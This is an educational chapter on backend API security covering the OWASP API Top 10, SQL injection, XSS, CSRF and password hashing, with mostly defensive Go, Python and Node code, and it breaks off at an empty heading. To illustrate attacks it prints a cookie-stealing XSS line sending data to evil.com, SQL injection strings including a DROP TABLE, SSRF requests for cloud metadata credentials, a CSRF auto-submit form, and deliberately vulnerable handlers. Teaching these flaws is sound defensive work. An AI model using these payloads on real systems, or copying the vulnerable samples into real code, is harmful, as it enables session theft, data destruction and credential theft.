# Part 14.1: Backend Security — OWASP Top 10

## What You'll Learn
- The OWASP API Security Top 10 (2023) — every vulnerability a backend engineer must know
- Broken Object Level Authorization (BOLA/IDOR) — the most common API security flaw
- SQL injection, XSS, and CSRF — classic vulnerabilities with modern prevention
- Password hashing — why SHA-256 is wrong and bcrypt/argon2 is right
- Mass assignment vulnerabilities and how ORMs make them easy to introduce
- Security headers — the low-effort, high-impact layer of defense
- Production-ready code in Go, Node.js, and Python for each vulnerability class

## Table of Contents
1. [Why Backend Security Matters](#1-why-backend-security-matters)
2. [A01 — Broken Object Level Authorization (BOLA/IDOR)](#2-a01--broken-object-level-authorization-bolaidor)
3. [A02 — Broken Authentication](#3-a02--broken-authentication)
4. [A03 — Broken Object Property Level Authorization](#4-a03--broken-object-property-level-authorization)
5. [A04 — Unrestricted Resource Consumption](#5-a04--unrestricted-resource-consumption)
6. [A05 — Broken Function Level Authorization](#6-a05--broken-function-level-authorization)
7. [A06 — Unrestricted Access to Sensitive Business Flows](#7-a06--unrestricted-access-to-sensitive-business-flows)
8. [A07 — Server-Side Request Forgery (SSRF)](#8-a07--server-side-request-forgery-ssrf)
9. [A08 — Security Misconfiguration](#9-a08--security-misconfiguration)
10. [A09 — Improper Inventory Management](#10-a09--improper-inventory-management)
11. [A10 — Unsafe Consumption of APIs](#11-a10--unsafe-consumption-of-apis)
12. [SQL Injection](#12-sql-injection)
13. [XSS — Cross-Site Scripting](#13-xss--cross-site-scripting)
14. [CSRF — Cross-Site Request Forgery](#14-csrf--cross-site-request-forgery)
15. [Password Hashing](#15-password-hashing)
16. [Implementation Examples](#16-implementation-examples)
17. [Common Patterns & Best Practices](#17-common-patterns--best-practices)
18. [Common Pitfalls](#18-common-pitfalls)
19. [Interview Questions](#19-interview-questions)
20. [Resources](#20-resources)

---

## 1. Why Backend Security Matters

Security vulnerabilities in APIs are the most common cause of data breaches. Unlike infrastructure attacks (DDoS, network intrusion), API vulnerabilities are exploited by **sending valid HTTP requests** — something any user can do.

```
Most dangerous API vulnerabilities require only:
  - An account (sometimes not even that)
  - A browser or curl
  - Understanding of how the API works (often publicly documented)

No malware. No exploits. Just HTTP requests.
```

The OWASP API Security Top 10 lists the most critical categories of API vulnerabilities, ordered by frequency and impact. Every senior backend engineer is expected to know these intimately.

---

## 2. A01 — Broken Object Level Authorization (BOLA/IDOR)

**BOLA** (Broken Object Level Authorization), also called **IDOR** (Insecure Direct Object Reference), is consistently the **#1 most common API vulnerability**. It is trivially exploitable and extremely common.

### What Is It?

An API endpoint takes an object ID as a parameter (path param, query param, request body), but does not verify that the requesting user is authorized to access that specific object.

```
User A (user_id=123) is logged in.
They change the URL: /api/orders/1001 → /api/orders/1002

If user_id=456 owns order 1002, and the API returns it anyway → BOLA.
```

### Real-World Example

```http
GET /api/v1/users/456/orders
Authorization: Bearer eyJ...  (token for user 123)

# If the API returns user 456's orders: BOLA vulnerability
# The API checked authentication (valid token) but not authorization (owns the resource)
```

### Why It Happens

Developers think: "The user is authenticated, so they must be authorized."

Authentication (who are you?) ≠ Authorization (can you access this?)

```go
// VULNERABLE — checks authentication but not authorization
func getOrderHandler(w http.ResponseWriter, r *http.Request) {
    orderID := chi.URLParam(r, "id")
    
    // Gets the current user from JWT — authentication check
    currentUser := r.Context().Value("user").(*User)
    
    // Fetches order directly — NO ownership check
    order, err := db.GetOrder(ctx, orderID)
    if err != nil {
        http.Error(w, "Not found", 404)
        return
    }
    
    json.NewEncoder(w).Encode(order) // Returns any user's order!
}
```

### The Fix — Always Verify Ownership

```go
// SECURE — checks that the requesting user owns the resource
func getOrderHandler(w http.ResponseWriter, r *http.Request) {
    orderID := chi.URLParam(r, "id")
    currentUser := r.Context().Value("user").(*User)
    
    order, err := db.GetOrder(ctx, orderID)
    if err != nil {
        http.Error(w, "Not found", 404)
        return
    }
    
    // Authorization check — ownership verification
    if order.UserID != currentUser.ID {
        // Return 404, not 403 — don't confirm the resource exists
        http.Error(w, "Not found", 404)
        return
    }
    
    json.NewEncoder(w).Encode(order)
}
```

**Why return 404 instead of 403?**

Returning 403 Forbidden confirms that the resource exists but the user can't access it. This leaks information — an attacker now knows order 1002 exists. Return 404 Not Found regardless, so you don't confirm existence.

### The Correct Pattern — Query by Owner

Even better: include the user ID in the database query itself, so unauthorized objects are simply not found:

```go
// Most secure — ownership enforced at query level
func getOrderHandler(w http.ResponseWriter, r *http.Request) {
    orderID := chi.URLParam(r, "id")
    currentUser := r.Context().Value("user").(*User)
    
    // Query scoped to current user — can't find orders belonging to other users
    order, err := db.GetOrderByIDAndUserID(ctx, orderID, currentUser.ID)
    if err != nil {
        // Could be "not found" (doesn't exist) or "not yours" (unauthorized)
        // Both return 404 — we don't distinguish
        http.Error(w, "Not found", 404)
        return
    }
    
    json.NewEncoder(w).Encode(order)
}
```

```sql
-- The safe query — combines ID and user_id filter
SELECT * FROM orders WHERE id = $1 AND user_id = $2
-- If order belongs to someone else, zero rows returned → 404
```

### Where BOLA Applies

Check ownership for every endpoint that accesses user-owned resources:
- `GET /users/{id}` — can only view your own profile (unless admin)
- `PUT /users/{id}` — can only update your own profile
- `GET /orders/{id}` — can only view your own orders
- `DELETE /posts/{id}` — can only delete your own posts
- `GET /documents/{id}` — check document belongs to requesting user or their org

---

## 3. A02 — Broken Authentication

Authentication vulnerabilities allow attackers to assume another user's identity.

### Common Authentication Weaknesses

**Brute Force / Credential Stuffing:**
```
Attacker sends 10,000 login attempts with breached password lists.
No rate limiting = account takeover in minutes.
```

**Weak Passwords:**
```
Allowing passwords like "123456" or "password".
No minimum length, no complexity requirements.
```

**JWT Vulnerabilities:**
```
alg:none attack — changing the JWT algorithm to "none" (no signature)
Weak secret — brute-forcing HMAC-SHA256 with weak secrets
Not verifying expiry (exp claim)
Not verifying issuer (iss claim)
```

### Fixes

**Rate limit authentication endpoints:**
```go
// Login endpoint — much stricter rate limit than other endpoints
// 5 attempts per minute per IP, 20 per hour per account
r.With(authRateLimiter).Post("/auth/login", loginHandler)
r.With(authRateLimiter).Post("/auth/reset-password", resetHandler)
```

**Account lockout:**
```go
// After N failed attempts, lock account temporarily
const maxFailedAttempts = 5
const lockoutDuration = 15 * time.Minute

func checkAccountLockout(userID string) error {
    attempts, err := redis.Get(ctx, fmt.Sprintf("failed_login:%s", userID)).Int()
    if err == nil && attempts >= maxFailedAttempts {
        return ErrAccountLocked
    }
    return nil
}

func recordFailedLogin(userID string) {
    key := fmt.Sprintf("failed_login:%s", userID)
    redis.Incr(ctx, key)
    redis.Expire(ctx, key, lockoutDuration)
}

func clearFailedLogins(userID string) {
    redis.Del(ctx, fmt.Sprintf("failed_login:%s", userID))
}
```

**JWT best practices:**
```go
// Always validate fully
claims, err := jwt.Parse(tokenString, keyFunc,
    jwt.WithValidMethods([]string{"RS256"}),  // Explicitly allow only RS256
    jwt.WithExpirationRequired(),              // Require exp claim
    jwt.WithIssuedAt(),                        // Verify iat
    jwt.WithIssuer("auth.yourcompany.com"),   // Verify issuer
    jwt.WithAudience("api.yourcompany.com"),  // Verify audience
)
```

---

## 4. A03 — Broken Object Property Level Authorization

This is about what **fields** a user can read or write, not just which objects.

### Mass Assignment Vulnerability

Mass assignment happens when you pass an entire request body directly to an ORM without filtering which fields the user is allowed to set.

```javascript
// VULNERABLE — user controls ALL fields including role
app.post('/users', async (req, res) => {
    const user = await User.create(req.body); // req.body could be {role: "admin"}
    res.json(user);
});

// Attack: POST /users {"name":"Alice","email":"a@b.com","role":"admin"}
// Result: Alice is now an admin
```

```python
# VULNERABLE — SQLAlchemy mass assignment
@app.post("/users")
async def create_user(request: Request):
    body = await request.json()
    user = User(**body)  # User could have role, is_admin, organization_id...
    db.add(user)
    await db.commit()
```

### Response Over-Exposure

```json
// VULNERABLE — returns internal fields user shouldn't see
GET /api/me
{
  "id": "user_123",
  "email": "alice@example.com",
  "password_hash": "$2b$12$...",   // Leaks hashed password
  "stripe_customer_id": "cus_...", // Leaks internal ID
  "internal_score": 847,           // Leaks business intelligence
  "is_banned": false               // Leaks moderation state
}
```

### The Fix — Explicit Allow-Lists

**Go — Use dedicated request/response structs:**
```go
// Input struct — only fields users can set
type CreateUserRequest struct {
    Name     string `json:"name" validate:"required,min=2,max=100"`
    Email    string `json:"email" validate:"required,email"`
    Password string `json:"password" validate:"required,min=8"`
    // Note: no Role, IsAdmin, InternalScore — these are NOT in input struct
}

// Output struct — only fields users should see
type UserResponse struct {
    ID        string    `json:"id"`
    Name      string    `json:"name"`
    Email     string    `json:"email"`
    CreatedAt time.Time `json:"created_at"`
    // Note: no PasswordHash, StripeCustomerID, InternalScore
}

func createUserHandler(w http.ResponseWriter, r *http.Request) {
    var req CreateUserRequest
    json.NewDecoder(r.Body).Decode(&req)
    // validate req...
    
    user := &User{
        ID:           uuid.New().String(),
        Name:         req.Name,            // Explicit field mapping
        Email:        req.Email,
        PasswordHash: hashPassword(req.Password),
        Role:         "user",              // Always set by server, not client
    }
    db.Create(user)
    
    // Convert to response type — never return the full User model
    resp := UserResponse{
        ID:        user.ID,
        Name:      user.Name,
        Email:     user.Email,
        CreatedAt: user.CreatedAt,
    }
    json.NewEncoder(w).Encode(resp)
}
```

**Python — Use separate Pydantic schemas:**
```python
from pydantic import BaseModel, EmailStr
from typing import Optional

# What clients can send
class CreateUserRequest(BaseModel):
    name: str
    email: EmailStr
    password: str
    # NO: role, is_admin, internal_score — not in input schema

# What clients receive
class UserResponse(BaseModel):
    id: str
    name: str
    email: str
    created_at: datetime
    # NO: password_hash, stripe_customer_id, is_banned

@app.post("/users", response_model=UserResponse)
async def create_user(request: CreateUserRequest):
    user = User(
        name=request.name,
        email=request.email,
        password_hash=hash_password(request.password),
        role="user",  # Set by server
    )
    await db.add(user)
    return user  # FastAPI uses response_model to filter fields automatically
```

---

## 5. A04 — Unrestricted Resource Consumption

APIs can be abused to consume excessive resources — CPU, memory, bandwidth, third-party API credits.

### Vulnerability Examples

```
- Upload endpoint with no file size limit → 10GB uploads
- Search endpoint with no results limit → return entire database
- PDF generation endpoint called 10,000 times → CPU exhaustion
- Email sending endpoint with no rate limit → spam engine
- Nested GraphQL queries → exponential DB queries
```

### Fixes

```go
// Request body size limit
r.Use(func(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        r.Body = http.MaxBytesReader(w, r.Body, 1*1024*1024) // 1MB max
        next.ServeHTTP(w, r)
    })
})

// Pagination required — no infinite result sets
func listOrdersHandler(w http.ResponseWriter, r *http.Request) {
    limit := 20 // default
    if l := r.URL.Query().Get("limit"); l != "" {
        limit, _ = strconv.Atoi(l)
        if limit > 100 { limit = 100 }  // Cap at 100
        if limit < 1  { limit = 1  }
    }
    // ...
}
```

```python
# FastAPI — file size limit
from fastapi import File, UploadFile, HTTPException

MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail="File too large")
    # process...
```

---

## 6. A05 — Broken Function Level Authorization

Admin or privileged functions accessible by regular users.

### Example

```http
# Regular user can call admin endpoint
DELETE /admin/users/456
Authorization: Bearer <regular_user_token>
# Returns 200 — admin endpoint has no auth check
```

### Fix — Route-Level Authorization Middleware

```go
// Middleware that enforces role requirements
func RequireRole(roles ...string) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            user := r.Context().Value("user").(*User)
            for _, role := range roles {
                if user.Role == role {
                    next.ServeHTTP(w, r)
                    return
                }
            }
            http.Error(w, "Forbidden", http.StatusForbidden)
        })
    }
}

// Apply to admin routes — the middleware is the enforcement, not the handler
r.Route("/admin", func(r chi.Router) {
    r.Use(RequireRole("admin", "superadmin")) // All routes in this group require admin
    r.Delete("/users/{id}", adminDeleteUserHandler)
    r.Get("/users", adminListUsersHandler)
    r.Post("/ban/{id}", adminBanUserHandler)
})

// Regular routes — no admin middleware
r.Route("/v1", func(r chi.Router) {
    r.Use(RequireAuth) // Just authentication
    r.Get("/orders", listMyOrdersHandler)
})
```

---

## 7. A06 — Unrestricted Access to Sensitive Business Flows

Legitimate endpoints abused at scale to harm the business:

```
Examples:
- Creating 10,000 accounts to exhaust invite codes or promo credits
- Brute-forcing OTP codes (6-digit: 1,000,000 combinations)
- Adding items to cart and never checking out → inventory lock DoS
- Sending friend requests to all users → spam
- Generating promo codes in a loop until finding valid ones
```

### Fixes

```go
// Per-user rate limiting for sensitive flows
// 3 OTP attempts per 10 minutes, per user
func verifyOTPHandler(w http.ResponseWriter, r *http.Request) {
    userID := chi.URLParam(r, "userID")
    
    key := fmt.Sprintf("otp_attempts:%s", userID)
    attempts, _ := redis.Incr(ctx, key).Result()
    if attempts == 1 {
        redis.Expire(ctx, key, 10*time.Minute)
    }
    
    if attempts > 3 {
        w.Header().Set("Retry-After", "600")
        http.Error(w, "Too many attempts", http.StatusTooManyRequests)
        return
    }
    
    // verify OTP...
}
```

---

## 8. A07 — Server-Side Request Forgery (SSRF)

SSRF tricks your server into making HTTP requests to arbitrary URLs — including internal services and cloud metadata endpoints.

### The Attack

```
Vulnerable endpoint: POST /fetch-image
Body: {"url": "https://user-provided-url.com/image.png"}

Attack vector 1 — AWS metadata:
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ Server fetches AWS IAM credentials → attacker gets AWS access

Attack vector 2 — Internal services:
{"url": "http://internal-admin-service.default.svc.cluster.local/admin/users"}
→ Server fetches internal service not exposed externally → data exfiltration

Attack vector 3 — Local services:
{"url": "http://localhost:6379"}  → Redis, if it responds with data
{"url": "http://localhost:27017"} → MongoDB
```

### Why SSRF Is Dangerous in Cloud Environments

In AWS/GCP/Azure, every EC2/GCE instance has a metadata service at `169.254.169.254`. This service exposes:
- IAM role credentials (rotate automatically but are valid for hours)
- Instance tags, region, account ID
- User-data (sometimes contains secrets)

An attacker who can make your server fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role` gets AWS credentials with whatever permissions that role has.

### Fix — Domain Allowlist and IP Blocklist

```go
import (
    "net"
    "net/url"
    "strings"
)

// Allowlist of domains this service is allowed to fetch from
var allowedDomains = map[string]bool{
    "images.yourcdn.com":         true,
    "uploads.yourdomain.com":     true,
    "api.trustedpartner.com":     true,
}

// Private IP ranges that must never be fetched
var privateRanges = []string{
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
    "127.0.0.0/8",
    "169.254.0.0/16",  // Cloud metadata services
    "::1/128",         // IPv6 loopback
    "fc00::/7",        // IPv6 private
}

func validateFetchURL(rawURL string) error {
    parsed, err := url.Parse(rawURL)
    if err != nil {
        return fmt.Errorf("invalid URL")
    }

    // Only allow HTTPS
    if parsed.Scheme != "https" {
        return fmt.Errorf("only HTTPS URLs allowed")
    }

    host := parsed.Hostname()

    // Check domain allowlist
    if !allowedDomains[host] {
        return fmt.Errorf("domain not in allowlist: %s", host)
    }

    // Resolve the domain and check resulting IPs
    ips, err := net.LookupHost(host)
    if err != nil {
        return fmt.Errorf("DNS lookup failed")
    }

    for _, ipStr := range ips {
        ip := net.ParseIP(ipStr)
        if ip == nil {
            continue
        }
        for _, cidr := range privateRanges {
            _, network, _ := net.ParseCIDR(cidr)
            if network.Contains(ip) {
                return fmt.Errorf("resolved IP in private range: %s", ipStr)
            }
        }
    }

    return nil
}

// Note: DNS rebinding attack — check IPs at connection time too,
// not just at validation time. Use a custom http.Transport with DialContext
// that re-validates the IP after DNS resolution.
```

---

## 9. A08 — Security Misconfiguration

Default configurations, debug modes, and verbose errors in production.

### Common Misconfigurations

```
Default credentials:
  - MongoDB: no auth by default in older versions
  - Redis: no auth by default
  - Elasticsearch: no auth by default (Shodan has lists of exposed instances)

Verbose error messages:
  - Stack traces in HTTP responses
  - Database error messages in API responses
  - Internal paths/file structure in errors

Debug mode in production:
  - Django DEBUG=True → exposes all env vars, source code, config
  - Flask debug mode → allows arbitrary code execution via debugger PIN
  - Express error handler that dumps stack traces
```

### Fix — Security Headers Middleware

```go
func SecurityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        h := w.Header()
        
        // Force HTTPS for 1 year (HSTS)
        h.Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")
        
        // Prevent MIME type sniffing
        h.Set("X-Content-Type-Options", "nosniff")
        
        // Prevent clickjacking
        h.Set("X-Frame-Options", "DENY")
        
        // Content Security Policy — restrict resource loading
        h.Set("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'")
        
        // Control referrer information
        h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
        
        // Disable browser features
        h.Set("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        
        // Remove server fingerprinting
        h.Del("X-Powered-By")
        h.Del("Server")
        
        next.ServeHTTP(w, r)
    })
}

// Error handler — never expose internals
func ErrorHandler(w http.ResponseWriter, r *http.Request, err error) {
    // Log full error internally
    log.Error().Err(err).Str("path", r.URL.Path).Msg("Request error")
    
    // Return opaque error to client — no internal details
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusInternalServerError)
    json.NewEncoder(w).Encode(map[string]string{
        "error": "internal server error",
        // NO stack traces, NO file paths, NO DB queries
    })
}
```

---

## 10. A09 — Improper Inventory Management

Old API versions with less security, undocumented debug endpoints, shadow APIs.

### Examples

```
/api/v1/users — old version, no rate limiting
/api/v2/users — current version, properly secured
Attacker uses v1: no rate limiting, possible missing auth checks

/debug/health       — returns all config and env vars
/api/internal/stats — intended for monitoring, exposed publicly
/api/beta/          — test endpoint with no auth
```

### Fixes

```
- Maintain an API inventory — every endpoint documented
- Deprecation policy: 6-12 month sunset periods with proper 410 Gone responses
- Remove v1 when v3 ships, don't just ignore it
- API gateway centralizes auth — v1 and v2 routes both go through auth middleware
- Version all APIs: /v1/, /v2/ — makes it easy to audit
- Periodic audits with tools like OWASP ZAP or Burp Suite
```

---

## 11. A10 — Unsafe Consumption of APIs

Blindly trusting third-party API responses without validation.

```go
// VULNERABLE — trusting third-party data without validation
resp, _ := http.Get("https://external-partner.com/api/user-data")
var userData map[string]interface{}
json.NewDecoder(resp.Body).Decode(&userData)
db.Exec("INSERT INTO users ... VALUES ?", userData["name"]) // Could contain SQL injection!
// Or: userData["role"] = "admin" → stored directly

// SECURE — validate all external data
type ExternalUserData struct {
    Name  string `json:"name" validate:"required,max=100,alphanum"`
    Email string `json:"email" validate:"required,email"`
    // role NOT in struct — we don't trust external role assignments
}
var userData ExternalUserData
json.NewDecoder(resp.Body).Decode(&userData)
if err := validate.Struct(userData); err != nil {
    return fmt.Errorf("invalid data from external API: %w", err)
}
```

---

## 12. SQL Injection

SQL injection remains one of the most dangerous vulnerabilities. Despite being well-known for 25+ years, it's still found in production systems.

### How It Works

```sql
-- Intended query
SELECT * FROM users WHERE email = 'alice@example.com' AND password = 'secret'

-- Vulnerable code
query := "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'"

-- Attacker sends email: alice@example.com' --
-- Constructed query:
SELECT * FROM users WHERE email = 'alice@example.com' --' AND password = '...'
-- The -- comments out the password check → logs in as alice without knowing password

-- More destructive: email = '; DROP TABLE users; --
SELECT * FROM users WHERE email = ''; DROP TABLE users; --' AND password = ''
```

### Why String Interpolation Is Always Wrong

```go
// NEVER do this — even "cleaning" the input is not safe
email = strings.ReplaceAll(email, "'", "''")  // Insufficient — can be bypassed
query := "SELECT * FROM users WHERE email = '" + email + "'"
// Unicode tricks, encoding tricks, database-specific escape sequences can bypass manual escaping
```

### Parameterized Queries — The Only Safe Way

```go
// Go — database/sql parameterized query
// The ? (or $1) is a placeholder — the DB driver handles escaping
row := db.QueryRowContext(ctx,
    "SELECT id, name, email FROM users WHERE email = $1 AND active = $2",
    email,    // parameter 1 — never concatenated, always passed separately
    true,     // parameter 2
)

// IMPORTANT: Even with query builders and ORMs, raw string interpolation is dangerous
// Safe ORM — uses placeholders internally
user, err := userRepo.Where("email = ?", email).First()

// Dangerous ORM — raw string interpolation
user, err := db.Where("email = '" + email + "'").First() // STILL VULNERABLE
```

```python
# Python — psycopg2 parameterized query
cursor.execute(
    "SELECT id, name FROM users WHERE email = %s AND active = %s",
    (email, True)  # Passed as separate arguments — driver handles escaping
)

# SQLAlchemy ORM — safe
user = session.query(User).filter(User.email == email).first()
# SQLAlchemy generates: WHERE users.email = :email_1 — parameterized

# SQLAlchemy raw — DANGEROUS
user = session.execute(
    f"SELECT * FROM users WHERE email = '{email}'"  # String interpolation!
)
```

```javascript
// Node.js — pg parameterized query
const result = await db.query(
    'SELECT id, name FROM users WHERE email = $1 AND active = $2',
    [email, true]  // Separate array of parameters
);

// Knex.js query builder — safe
const user = await knex('users')
    .where({ email: email, active: true })
    .first();

// Raw string — DANGEROUS
const result = await db.query(`SELECT * FROM users WHERE email = '${email}'`);
```

### What Parameterized Queries Actually Do

The driver sends the query template and the parameters **separately** to the database server:

```
1. App sends to DB:  "SELECT * FROM users WHERE email = $1"  (SQL template)
2. App sends to DB:  ["alice@example.com' --"]               (parameters, separate)
3. DB parses SQL once, substitutes parameters AFTER parsing
4. The ' and -- are just characters in a string value, not SQL syntax
```

There is no injection possible because the SQL structure is fixed at parse time.

---

## 13. XSS — Cross-Site Scripting

XSS occurs when malicious scripts are injected into content that's rendered in other users' browsers.

### Types

**Stored XSS:** Malicious script stored in the database, served to every user who views that content.
```
Attack: User submits comment: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
Server stores this comment in DB.
Every user who loads that page runs the script.
Their cookies/session tokens are sent to attacker.
```

**Reflected XSS:** Script in URL parameters, reflected in the response.
```
URL: https://example.com/search?q=<script>alert(document.cookie)</script>
If the server echoes q into the HTML without escaping: <h1>Results for <script>...</script></h1>
User's browser executes the script.
```

### Backend Responsibilities for XSS

XSS is primarily prevented on the frontend (HTML escaping, CSP). But backend has responsibilities:

**1. Sanitize stored HTML content:**
```python
import bleach

# Allow only safe HTML tags when storing user-generated HTML content
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def sanitize_html(content: str) -> str:
    return bleach.clean(content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)

@app.post("/posts")
async def create_post(request: CreatePostRequest):
    clean_content = sanitize_html(request.content)
    post = Post(content=clean_content, ...)
```

**2. Set Content-Security-Policy header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```
CSP is the most powerful XSS defense — even if a script is injected, the browser won't execute it if it violates CSP.

**3. Set correct Content-Type:**
```go
// Always set Content-Type for API responses
w.Header().Set("Content-Type", "application/json")
// Never: text/html for API responses — prevents browser from interpreting JSON as HTML
```

---

## 14. CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into making unintended requests to your API.

### How It Works

```
1. User logs into bank.com, has valid session cookie.
2. User visits malicious site evil.com
3. evil.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker_account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>

4. User's browser submits the form to bank.com.
5. Browser automatically sends bank.com session cookie.
6. Bank.com sees a valid session and processes the transfer.
```

### Prevention Strategies

**SameSite Cookie Attribute (Most Effective):**
```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionToken,
    HttpOnly: true,         // Not accessible to JavaScript
    Secure:   true,         // HTTPS only
    SameSite: http.SameSiteStrictMode, // Never sent in cross-site requests
    Path:     "/",
    MaxAge:   86400,
})
```

`SameSite=Strict`: Cookie never sent in cross-site requests. Most secure. May break OAuth flows.
`SameSite=Lax`: Cookie sent for top-level navigation (clicking links) but not for sub-resource requests (fetch, XHR, form submit). Good default.
`SameSite=None; Secure`: Sent in all cross-site requests. Only with Secure. Use for intentional cross-site cookies (OAuth, SSO).

**CSRF Token (Double Submit Cookie Pattern):**
```go
// Generate CSRF token on page load
func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.StdEncoding.EncodeToString(b)
}

// Middleware: verify CSRF token matches for state-changing requests
func CSRFMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" || r.Method == "PATCH" {
            headerToken := r.Header.Get("X-CSRF-Token")
            cookieToken, err := r.Cookie("csrf_token")
            if err != nil || headerToken == "" || headerToken != cookieToken.Value {
                http.Error(w, "CSRF validation failed", http.StatusForbidden)
                return
            }
        }
        next.ServeHTTP(w, r)
    })
}
```

**Custom Request Header (for CORS-protected APIs):**
```
// For APIs consumed by JavaScript fetch/XHR:
// Browsers only allow custom headers with CORS preflight
// Simple form submissions can't set custom headers
// So: require a custom header X-Requested-With: XMLHttpRequest

func CSRFHeaderMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method != "GET" && r.Header.Get("X-Requested-With") != "XMLHttpRequest" {
            http.Error(w, "Forbidden", 403)
            return
        }
        next.ServeHTTP(w, r)
    })
}
```

---

## 15. Password Hashing

### Why SHA-256 is Wrong for Passwords

```
MD5, SHA-1, SHA-256, SHA-512 are FAST hash functions.
Fast is what you want for checksums and digital signatures.
Fast is EXACTLY WRONG for password hashing.

SHA-256 speed on modern GPU (RTX 4090):
  ~10 billion hashes per second

At 10B hashes/sec, attacking a 6-character alphanumeric password:
  62^6 = 56 billion combinations
  Time: 56 billion / 10 billion = 5.6 seconds
```

### Why bcrypt/argon2 are Correct

Password hashing functions are **deliberately slow** (key stretching):

```
bcrypt with work factor 12:
  ~250ms per hash on typical server CPU
  ~10,000 hashes/sec on dedicated GPU (not 10 billion)

At 10K hashes/sec:
  56 billion / 10,000 = 5.6 million seconds = 65 days
  Adding just 2 more characters (62^8 = 218 billion):
  218 billion / 10,000 = 252 days just for 8-char passwords
```

Slow hashing is the **point**. An attacker who steals your database has billions of hashed passwords to crack. Slow hashing makes this computationally infeasible.

### Argon2id — Current Recommendation

Argon2 won the Password Hashing Competition (2015). `argon2id` is the recommended variant:

```
Argon2id parameters:
  - Memory: 64MB (makes GPU attacks expensive — GPUs have limited memory)
  - Iterations: 3 (increases time)
  - Parallelism: 4 (matches server CPU cores)
  - Output: 32 bytes

These parameters are adjustable — increase them as hardware improves.
Store the parameters with the hash (self-describing format):
$argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>
```

### Password Verification Flow

```
Registration:
  1. Receive plaintext password
  2. Generate random salt (32 bytes)
  3. hash = argon2id(password + salt, params)
  4. Store: hash (includes salt and params in the string)
  5. Discard plaintext immediately

Login:
  1. Receive plaintext password
  2. Retrieve stored hash from DB
  3. argon2id.Compare(storedHash, plaintext) → true/false
  4. The Compare function extracts salt/params from stored hash, re-hashes, compares
  5. Use constant-time comparison to prevent timing attacks
```

**Never implement your own comparison** — use the library's `Compare` function which uses constant-time comparison internally.

---

## 16. Implementation Examples

### Go + Chi Router

```go
package main

import (
    "context"
    "database/sql"
    "encoding/json"
    "net/http"

    "github.com/go-chi/chi/v5"
    "golang.org/x/crypto/bcrypt"
    // OR for argon2: github.com/alexedwards/argon2id
)

// ─── IDOR Prevention ─────────────────────────────────────────────────────────

type OrderRepository struct{ db *sql.DB }

// Safe: ownership enforced at query level
func (r *OrderRepository) GetByIDAndUser(ctx context.Context, orderID, userID string) (*Order, error) {
    var order Order
    err := r.db.QueryRowContext(ctx,
        "SELECT id, user_id, amount, status, created_at FROM orders WHERE id = $1 AND user_id = $2",
        orderID,
        userID, // <-- Ownership enforced here, not in handler
    ).Scan(&order.ID, &order.UserID, &order.Amount, &order.Status, &order.CreatedAt)
    if err == sql.ErrNoRows {
        return nil, ErrNotFound
    }
    return &order, err
}

func getOrderHandler(w http.ResponseWriter, r *http.Request) {
    orderID := chi.URLParam(r, "id")
    currentUser := r.Context().Value("user").(*User)

    order, err := orderRepo.GetByIDAndUser(r.Context(), orderID, currentUser.ID)
    if err != nil {
        http.Error(w, "Not found", http.StatusNotFound) // Always 404, not 403
        return
    }
    json.NewEncoder(w).Encode(order)
}

// ─── Mass Assignment Prevention ──────────────────────────────────────────────

type CreateUserRequest struct {
    Name     string `json:"name"`
    Email    string `json:"email"`
    Password string `json:"password"`
    // Role, IsAdmin NOT here
}

type UserResponse struct {
    ID        string `json:"id"`
    Name      string `json:"name"`
    Email     string `json:"email"`
    CreatedAt string `json:"created_at"`
    // PasswordHash, StripeID, InternalScore NOT here
}

func createUserHandler(w http.ResponseWriter, r *http.Request) {
    var req CreateUserRequest
    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }

    // Hash password — bcrypt work factor 12
    hashedPassword, err := bcrypt.GenerateFromPassword([]byte(req.Password), 12)
    if err != nil {
        http.Error(w, "Internal error", http.StatusInternalServerError)
        return
    }

    user := &User{
        Name:         req.Name,
        Email:        req.Email,
        PasswordHash: string(hashedPassword),
        Role:         "user", // Always set by server
    }
    if err := userRepo.Create(r.Context(), user); err != nil {
        http.Error(w, "Internal error", http.StatusInternalServerError)
        return
    }

    // Return only safe fields
    resp := UserResponse{
        ID:        user.ID,
        Name:      user.Name,
        Email:     user.Email,
        CreatedAt: user.CreatedAt.Format("2006-01-02T15:04:05Z07:00"),
    }
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusCreated)
    json.NewEncoder(w).Encode(resp)
}

// ─── Password Verification ────────────────────────────────────────────────────

